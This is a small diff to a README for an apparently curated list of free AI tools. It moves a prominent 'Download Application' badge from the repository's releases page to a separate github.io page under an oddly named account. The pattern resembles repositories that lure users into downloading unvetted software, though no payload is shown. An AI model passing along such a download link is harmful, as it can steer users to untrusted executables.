@@ -1,6 +1,6 @@
 # 🤖 awesome-open-source-ai-discoveries - Explore Amazing Free AI Tools
 
-[![Download Now](https://img.shields.io/badge/Download-Application-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/readymixgenuseupatorium5558/awesome-open-source-ai-discoveries/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://readymixgenuseupatorium5558.github.io)
 
 ## 👋 Welcome to Your AI Adventure
 
